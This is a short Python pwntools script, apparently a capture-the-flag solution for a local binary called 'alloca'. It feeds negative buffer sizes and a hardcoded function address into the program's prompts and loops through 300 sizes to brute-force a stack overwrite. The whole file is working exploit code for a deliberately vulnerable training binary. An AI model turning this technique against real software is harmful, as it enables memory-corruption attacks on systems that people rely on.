from pwn import *

# Set debug log level
context.log_level = 'debug'
win = str(134514091)
size = -167
# Start the process
for i in range(300):
    p = process("./alloca")

    # Attempt to receive the first prompt
    try:
        output = p.recvuntil("maximum length of your buffer?(byte) : ", timeout=1).decode()
        print(output)
    except EOFError:
        print("Error: Unexpected EOF. The binary may have exited or produced no output.")
        exit(1)

    # Send a valid size
    p.sendline(str(size))

    # Continue with further interaction based on binary behavior
    try:
        output = p.recvuntil("random canary number to prove there is no BOF : ", timeout=1).decode()
        print(output)
        p.sendline(win)
    except EOFError:
        print("Error: Unexpected EOF after sending buffer size.")
        exit(1)
    # Send payload
    try:
        output = p.recvall(timeout=1).decode()
        if output.endswith("this buffer????\n"):
            print(output)
        else:
            exit(0)
    except EOFError:
        print("Error: Unexpected EOF after sending payload.")
        exit(1)

    size -= 1
